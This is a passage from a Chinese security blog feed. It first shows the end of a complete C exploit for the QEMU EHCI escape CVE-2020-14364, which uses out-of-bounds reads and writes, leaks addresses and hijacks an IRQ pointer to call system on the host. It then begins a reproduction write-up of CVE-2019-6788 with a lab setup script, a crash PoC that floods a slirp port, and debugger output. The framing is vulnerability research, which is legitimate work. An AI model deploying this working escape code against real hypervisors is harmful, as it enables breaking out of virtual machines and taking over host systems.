class="number">0</span>] = <span class="number">0x00</span>;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oob_read</span><span class="params">(<span class="keyword">uint64_t</span> length,<span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        perpare_read();    </span><br><span class="line">        set_length(length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data_buf[<span class="number">0</span>] = <span class="string">'R'</span>;</span><br><span class="line">    data_buf[<span class="number">1</span>] = <span class="string">'e'</span>;</span><br><span class="line">    data_buf[<span class="number">2</span>] = <span class="string">'s'</span>;</span><br><span class="line">    data_buf[<span class="number">3</span>] = <span class="string">'e'</span>;</span><br><span class="line">    data_buf[<span class="number">4</span>] = <span class="string">'r'</span>;</span><br><span class="line">    data_buf[<span class="number">5</span>] = <span class="string">'y'</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf)); <span class="comment">// periodiclistbase</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oob_write</span><span class="params">(<span class="keyword">uint64_t</span> offset,<span class="keyword">uint64_t</span> setup_len,<span class="keyword">uint64_t</span> setup_index,<span class="keyword">int</span> perpare)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(perpare)&#123;</span><br><span class="line">        perpare_write();</span><br><span class="line">        set_length(<span class="number">0x1010</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_bufoob + offset) = <span class="number">0x0000000200000002</span>; <span class="comment">// 覆盖成原先的内容</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(data_bufoob + <span class="number">0x8</span> +offset) = setup_len; <span class="comment">//setup_len</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(data_bufoob + <span class="number">0xc</span>+ offset) = setup_index;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">anywhere_read</span><span class="params">(<span class="keyword">uint64_t</span> target_addr)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\033[47;31m[*] Anywhere Read\033[0m"</span>);</span><br><span class="line">    <span class="comment">//set_length(0x1010);</span></span><br><span class="line">    oob_write(<span class="number">0x0</span>,<span class="number">0x1010</span>,<span class="number">0xfffffff8</span><span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_buf) = <span class="number">0x2000000000000080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> target_offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0x8</span>,<span class="number">0xffff</span>,target_offset - <span class="number">0x1018</span>,<span class="number">0</span>);</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">anywhere_write</span><span class="params">(<span class="keyword">uint64_t</span> target_addr,<span class="keyword">uint64_t</span> payload,<span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\033[47;31m[*] Anywhere Write\033[0m"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, offset+<span class="number">0x8</span>, offset<span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\033[41;37m[*] Hacked!\033[0m\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_buf) = payload;</span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line">    mlock(dmabuf, <span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf("[*] mmio_mem : %p\n", mmio_mem);</span></span><br><span class="line">    <span class="comment">//printf("[*] dmabuf : %p\n",dmabuf);</span></span><br><span class="line"></span><br><span class="line">    entry = dmabuf + <span class="number">0x4</span>;</span><br><span class="line">    qh = dmabuf + <span class="number">0x100</span>;</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    setup_buf = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    data_buf = dmabuf + <span class="number">0x1000</span>;</span><br><span class="line">    data_bufoob = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    first_leak_data = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    second_leak_data = dmabuf + <span class="number">0x1000</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\033[41;37m[*] Beginning\033[0m"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\033[47;31m[*] Wait a moment\033[0m"</span>);</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[41;37m[*] Step 1/3\033[0m\n"</span>);</span><br><span class="line"></span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">1</span>);</span><br><span class="line">    device_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">36</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        device_addr |= tmp &lt;&lt; ((i<span class="number">-36</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    func_addr = <span class="number">0</span>;</span><br><span class="line">    port_addr = device_addr+<span class="number">0x78</span>;</span><br><span class="line">    data_buf_addr = device_addr+<span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] Devices addr : 0x%lx\033[0m\n"</span>,device_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] Port addr : 0x%lx\033[0m\n"</span>,port_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] Data Buf addr : 0x%lx\033[0m\n"</span>,data_buf_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0x4fc</span>;i&lt;<span class="number">0x4fc</span>+<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        func_addr |= tmp &lt;&lt; ((i<span class="number">-0x4fc</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    proc_base = func_addr - <span class="number">0x1069490</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] Func addr : 0x%lx\033[0m\n"</span>,func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] proc base : 0x%lx\033[0m\n"</span>,proc_base);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uint64_t system_addr = func_addr - 0xb5c860;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = proc_base + <span class="number">0x2BE010</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] System addr : 0x%lx\033[0m\n"</span>,system_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[41;37m[*] Step 2/3\033[0m\n"</span>);</span><br><span class="line"></span><br><span class="line">    anywhere_read(port_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        port_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] port ptr : 0x%lx\033[0m\n"</span>,port_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> EHCIState_addr = port_ptr - <span class="number">0x530</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> irq_addr = EHCIState_addr + <span class="number">0xb8</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> fake_irq_addr = data_buf_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> irq_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    anywhere_read(irq_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        irq_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] Port ptr : 0x%lx\033[0m\n"</span>,port_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] EHCIState addr : 0x%lx\033[0m\n"</span>,EHCIState_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] IRQ addr : 0x%lx\033[0m\n"</span>,irq_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] Fake IRQ addr : 0x%lx\033[0m\n"</span>,fake_irq_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[47;31m[*] IRQ ptr : 0x%lx\033[0m\n"</span>,irq_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x636c616378</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\033[41;37m[*] Step 3/3\033[0m\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    anywhere_write(irq_addr, fake_irq_addr,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/8320?accounttraceid=0e173255bae642d2862438e20159e018fgib#toc-8" target="_blank" rel="noopener">CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路</a></p>
<p><a href="https://www.anquanke.com/post/id/227283#h2-8" target="_blank" rel="noopener">CVE-2020-14364漏洞复现——Qemu逃逸漏洞</a></p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2019-6788 Qemu逃逸漏洞复现与分析</title>
    <url>/2021/01/02/cve-2019-6788/</url>
    <content><![CDATA[<h1 id="CVE-2019-6788-Qemu逃逸漏洞复现与分析"><a href="#CVE-2019-6788-Qemu逃逸漏洞复现与分析" class="headerlink" title="CVE-2019-6788 Qemu逃逸漏洞复现与分析"></a>CVE-2019-6788 Qemu逃逸漏洞复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-6788是一个QEMU的堆溢出漏洞，本篇文章基于<code>raycp</code>师傅的分析复现，中间补充一些细节方便自己理解。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>手里有GEEKPWN2020决赛的一道qemu的题目，那道题是改的这个CVE，因此我直接拿过来用了，不过对比了一下它和raycp师傅的脚本，发现没什么区别，估计也是出题人直接拿来用的。</p>
<p>下面是创建文件系统的脚本，需要提前装<code>debootstrap</code>，我没挂代理然后挂了一宿才下完2333.当前目录下的<code>ssh/id_rsa</code>为ssh的私钥。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mkdir qemu</span><br><span class="line"></span><br><span class="line">sudo debootstrap --include=openssh-server,curl,tar,gcc,\</span><br><span class="line">libc6-dev,time,strace,sudo,less,psmisc,\</span><br><span class="line">selinux-utils,policycoreutils,checkpolicy,selinux-policy-default \</span><br><span class="line">stretch qemu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">'/^root/ &#123; s/:x:/::/ &#125;'</span> qemu/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100'</span> | sudo tee -a qemu/etc/inittab</span><br><span class="line"><span class="comment">#printf '\nauto enp0s3\niface enp0s3 inet dhcp\n' | sudo tee -a qemu/etc/network/interfaces</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">'\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n'</span> | sudo tee -a qemu/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'debugfs /sys/kernel/debug debugfs defaults 0 0'</span> | sudo tee -a qemu/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"kernel.printk = 7 4 1 3"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'debug.exception-trace = 0'</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.core.bpf_jit_enable = 1"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.core.bpf_jit_harden = 2"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.ipv4.ping_group_range = 0 65535"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">"127.0.0.1\tlocalhost\n"</span> | sudo tee qemu/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"nameserver 8.8.8.8"</span> | sudo tee -a qemu/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ubuntu"</span> | sudo tee qemu/etc/hostname</span><br><span class="line">sudo mkdir -p qemu/root/.ssh/</span><br><span class="line">rm -rf ssh</span><br><span class="line">mkdir -p ssh</span><br><span class="line">ssh-keygen -f ssh/id_rsa -t rsa -N <span class="string">''</span></span><br><span class="line">cat ssh/id_rsa.pub | sudo tee qemu/root/.ssh/authorized_keys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=qemu.img bs=1M seek=2047 count=1</span><br><span class="line">sudo mkfs.ext4 -F qemu.img</span><br><span class="line">sudo mkdir -p /mnt/qemu</span><br><span class="line">sudo mount -o loop qemu.img /mnt/qemu</span><br><span class="line">sudo cp -a qemu/. /mnt/qemu/.</span><br><span class="line">sudo umount /mnt/qemu</span><br></pre></td></tr></table></figure>
<p>启动脚本如下：其中hostfwd做了端口转发，因此我们传输文件可以使用<code>scp -i ./ssh/id_rsa -P2222 ./1 root@localhost:/</code>。内核文件随便找一个就可以。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo ./qemu-system-x86_64 \</span><br><span class="line">	-kernel ./bzImage \</span><br><span class="line">	-append <span class="string">"console=ttyS0 root=/dev/sda rw"</span> \</span><br><span class="line">	-hda ./qemu.img \</span><br><span class="line">	-<span class="built_in">enable</span>-kvm -m 2G -nographic \</span><br><span class="line">	-net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure>
<p>在github下载qemu的源码，切换到漏洞版本，编译即可。这里直接搬运raycp师傅的命令。如果觉得慢，可以拿<code>hub.fastgit.org</code>替换<code>github.com</code>然后走https clone。下面的configure开启了调试，因而最后的bin文件包含符号表。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v3.1.0</span><br><span class="line">mkdir -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --<span class="built_in">enable</span>-debug --<span class="built_in">disable</span>-werror</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
<p>本漏洞复现于ubuntu 18.04，gcc的版本如下。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wz@wz-virtual-machine:~/Desktop/CTF/CVE-2019-6788/start_qemu$ gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper</span><br><span class="line">OFFLOAD_TARGET_NAMES=nvptx-none</span><br><span class="line">OFFLOAD_TARGET_DEFAULT=1</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=<span class="string">'Ubuntu 7.5.0-3ubuntu1~18.04'</span> --with-bugurl=file:///usr/share/doc/gcc-7/README.Bugs --<span class="built_in">enable</span>-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++ --prefix=/usr --with-gcc-major-version-only --program-suffix=-7 --program-prefix=x86_64-linux-gnu- --<span class="built_in">enable</span>-shared --<span class="built_in">enable</span>-linker-build-id --libexecdir=/usr/lib --without-included-gettext --<span class="built_in">enable</span>-threads=posix --libdir=/usr/lib --<span class="built_in">enable</span>-nls --<span class="built_in">enable</span>-bootstrap --<span class="built_in">enable</span>-clocale=gnu --<span class="built_in">enable</span>-libstdcxx-debug --<span class="built_in">enable</span>-libstdcxx-time=yes --with-default-libstdcxx-abi=new --<span class="built_in">enable</span>-gnu-unique-object --<span class="built_in">disable</span>-vtable-verify --<span class="built_in">enable</span>-libmpx --<span class="built_in">enable</span>-plugin --<span class="built_in">enable</span>-default-pie --with-system-zlib --with-target-system-zlib --<span class="built_in">enable</span>-objc-gc=auto --<span class="built_in">enable</span>-multiarch --<span class="built_in">disable</span>-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --<span class="built_in">enable</span>-multilib --with-tune=generic --<span class="built_in">enable</span>-offload-targets=nvptx-none --without-cuda-driver --<span class="built_in">enable</span>-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)</span><br></pre></td></tr></table></figure>
<p>启动之后宿主机的ip为<code>10.0.2.2</code>，虚拟机ip为<code>10.0.2.15</code>，由于是持久化的磁盘文件，因此可以使用<code>apt install net-tools</code>安装net-tools来使用ifconfig命令。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>为了确定编译和环境没有问题，我们先打一发poc，poc代码如下，从虚拟机中连接宿主机的113端口，需要先在宿主机中用<code>sudo nc -lvknp 113</code>监听113端口，这里-k参数可以保证端口持续监听，这样就不用每次手动重新启动nc。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(<span class="string">"10.0.2.2"</span>); <span class="comment">// host IP</span></span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>);                   <span class="comment">// vulnerable port</span></span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'A'</span>, <span class="number">0x500</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        write(s, buf, <span class="number">0x500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译之后scp传到虚拟机中，执行后qemu崩溃，poc攻击成功。</p>
<p>根据wp将断点断到tcp_emu函数，一直continue直到崩溃产生，打印一下调用栈，</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line"><span class="comment">#0  0x000056278dee26be in tcp_emu (so=0x7f57c4012800, m=0x7f57c4023c80) at /home/wz/qemu/slirp/tcp_subr.c:641</span></span><br><span class="line"><span class="comment">#1  0x000056278dedea5c in tcp_input (m=0x7f57c4023c80, iphlen=0x14, inso=0x0, af=0x2) at /home/wz/qemu/slirp/tcp_input.c:571</span></span><br><span class="line"><span class="comment">#2  0x000056278ded5767 in ip_input (m=0x7f57c4023c80)</span></span><br><span class="line">    at /home/wz/qemu/slirp/ip_input.c:206</span><br><span class="line"><span class="comment">#3  0x000056278ded8cb8 in slirp_input (slirp=0x56279009d400, pkt=0x5627910329b0 "RU\n", pkt_len=0x536)</span></span><br><span class="line">    at /home/wz/qemu/slirp/slirp.c:876</span><br><span class="line"><span class="comment">#4  0x000056278dec0eec in net_slirp_receive (nc=0x56279009d1d0, buf=0x5627910329b0 "RU\n", size=0x536)</span></span><br><span class="line">    at /home/wz/qemu/net/slirp.c:113</span><br><span class="line"><span class="comment">#5  0x000056278deb68c6 in nc_sendv_compat (nc=0x56279009d1d0, iov=0x7f57cce95bd0, iovcnt=0x1, flags=0x0)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:706</span><br><span class="line"><span class="comment">#6  0x000056278deb6988 in qemu_deliver_packet_iov (sender=0x56279009cb90, flags=0x0, iov=0x7f57cce95bd0, iovcnt=0x1, opaque=0x5627900</span></span><br><span class="line">9d1d0) at /home/wz/qemu/net/net.c:734</span><br><span class="line"><span class="comment">#7  0x000056278deb9541 in qemu_net_queue_deliver_iov (queue=0x56279009d3c0, sender=0x56279009cb90, flags=0x0, iov=0x7f57cce95bd0, iov</span></span><br><span class="line">cnt=0x1) at /home/wz/qemu/net/queue.c:179</span><br><span class="line"><span class="comment">#8  0x000056278deb96b0 in qemu_net_queue_send_iov (queue=0x56279009d3c0, sender=0x56279009cb90, flags=0x0, iov=0x7f57cce95bd0, iovcnt</span></span><br><span class="line">=0x1, sent_cb=0x0) at 